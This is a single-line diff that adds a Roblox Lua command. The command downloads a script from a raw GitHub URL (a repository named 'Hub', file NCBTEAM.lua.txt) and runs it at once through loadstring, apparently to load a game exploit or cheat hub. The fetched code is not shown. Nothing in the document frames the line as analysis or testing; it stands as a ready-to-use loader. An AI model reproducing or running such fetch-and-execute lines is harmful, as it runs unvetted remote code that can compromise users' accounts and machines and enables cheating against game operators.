@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/npcteamvip/Hub/refs/heads/main/NCBTEAM.lua.txt"))()
